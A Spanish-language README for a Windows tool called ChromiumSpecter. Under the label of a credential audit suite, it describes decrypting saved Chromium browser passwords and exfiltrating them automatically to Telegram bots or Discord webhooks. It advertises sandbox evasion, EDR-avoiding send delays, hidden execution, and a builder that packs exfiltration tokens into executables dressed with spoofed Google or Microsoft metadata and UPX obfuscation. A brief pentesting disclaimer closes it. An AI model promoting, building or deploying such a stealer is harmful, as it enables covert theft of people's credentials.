# 🛡️ ChromiumSpecter Auditor Suite

> [!NOTE]
> [English Version](README.en.md) | **Versión en Español**

<div align="center">

![Windows](https://img.shields.io/badge/Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)
![Python](https://img.shields.io/badge/Python-3776AB?style=for-the-badge&logo=python&logoColor=white)
![SQLite](https://img.shields.io/badge/SQLite-07405E?style=for-the-badge&logo=sqlite&logoColor=white)
![Telegram](https://img.shields.io/badge/Telegram-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white)
![Discord](https://img.shields.io/badge/Discord-5865F2?style=for-the-badge&logo=discord&logoColor=white)

*La suite definitiva de grado táctico para auditorías de seguridad en navegadores Chromium.*

[Reportar Bug](https://github.com/ANONIMO432HZ/decrypt-chromium-suite/issues) | [Solicitar Mejora](https://github.com/ANONIMO432HZ/decrypt-chromium-suite/issues)

</div>

---

## 💻 Resumen de Capacidades

**ChromiumSpecter** es una suite de auditoría de credenciales diseñada para entornos Windows, enfocada en la discreción, la automatización y la ergonomía operativa. Permite extraer, descifrar y exfiltrar datos de navegadores basados en Chromium (v80+) con una arquitectura modular y resiliente.

### 🌟 Características Destacadas

*   **🖥️ Dashboard de Alta Densidad**: Interfaz gráfica profesional con consolas en tiempo real, estadísticas dinámicas y gestión de resultados mediante pools de widgets optimizados.
*   **🕵️ Motor de Sigilo (Tactical Stealth)**:
    *   **Startup Delay**: Selector de retraso inicial (0-300s) para evadir análisis en Sandbox y Sandbox inteligentes.
    *   **Inter-file Delay (`send_delay`)**: Pausas personalizables entre envíos para prevenir picos de tráfico que alerten a firewalls o EDRs.
    *   **Startup Hidden**: Opción para ejecutar el binario sin consola y de forma totalmente invisible.
*   **🚀 Exfiltración Inteligente**:
    *   **Auto-Exfiltración**: Configuración para envío automático inmediato tras la auditoría.
    *   **Multi-Canal**: Soporte nativo para **Telegram Bots** y **Discord Webhooks** con redundancia.
    *   **Persistencia Local**: Guardado seguro de configuraciones de exfiltración para uso recurrente.
*   **🛠️ Builder Visual Integrado**:
    *   Generación de stubs personalizados con **Inyección Dinámica** de parámetros.
    *   **Spoofing de Metadatos**: Presets integrados (Google, Microsoft, Intel) para clonar firmas de ejecutables legítimos.
    *   **Compresión y Ofuscación**: Soporte nativo para UPX y capas de ofuscación híbrida.

---

## 🚀 Flujo de Trabajo Táctico

1.  **Configuración**: Define tus tokens de Telegram/Discord en el Tab de **Exfiltración** y guárdalos.
2.  **Auditoría**: Lanza el escaneo desde el Dashboard. Puedes activar la **Auto-exfiltración** para automatizar el ciclo completo.
3.  **Inspección**: Visualiza las credenciales descifradas en tiempo real en el Tab de **Resultados**.
4.  **Despliegue**: Usa el **Builder** para generar un `.exe` con tus credenciales embebidas (Base64) y presets de sigilo configurados.

---

## ⚙️ Parámetros de Compilación (Stub)

Al usar el **Builder**, puedes inyectar los siguientes comportamientos en tu binario final:

| Parámetro | Rango / Opción | Propósito |
| :--- | :--- | :--- |
| **Delay Inicial** | 0s - 300s | Retraso antes de la primera acción (Anti-Sandbox). |
| **Send Delay** | 0s - 10s | Pausa entre archivos enviados (Evasión de tráfico). |
| **Webhook Timeout**| 5s - 60s | Tiempo de espera para conexiones inestables. |
| **Auto-Exfiltrate**| Checkbox | Activa el envío automático sin intervención. |
| **UAC Prompt** | Toggle | Solicita privilegios de administrador si es necesario. |

---

## 🛠️ Stack Tecnológico

| Componente | Tecnología |
| :--- | :--- |
| **Core UI** | `CustomTkinter` (Modern Dark Theme) |
| **Criptografía** | `AES-GCM 256` via `PyCryptodomex` |
| **Seguridad OS** | `Windows DPAPI` / `Win32 API` |
| **Compilación** | `PyInstaller` + `UPX` |
| **Persistencia** | `JSON` Local (.audit/exfil_config.json) |

---

## ⚙️ Guía de Instalación

```bash
# 1. Clonar el repositorio
git clone https://github.com/ANONIMO432HZ/decrypt-chromium-suite.git
cd decrypt-chromium-suite

# 2. Instalar dependencias
pip install -r requirements.txt

# 3. Lanzar el Dashboard
python gui_app.py
```

---

## 📡 Configuración de Exfiltración

### 🤖 Telegram
Requiere **Token** y **Chat ID**.
*   Obtén el token con `@BotFather`.
*   Obtén tu ID con `@userinfobot`.

### 🎮 Discord
Requiere **Webhook URL**.
*   Configúralo en: Ajustes del Canal -> Integraciones -> Webhooks.

---

## ⚖️ Aviso Legal y Ético

> [!CAUTION]
> **ESTE SOFTWARE ES PARA FINES DE PENTESTING ÉTICO Y AUDITORÍA PROFESIONAL.**
> El uso de esta herramienta para acceder a sistemas sin la autorización explícita del propietario es ilegal. El autor no asume responsabilidad por el mal uso de esta suite.

---
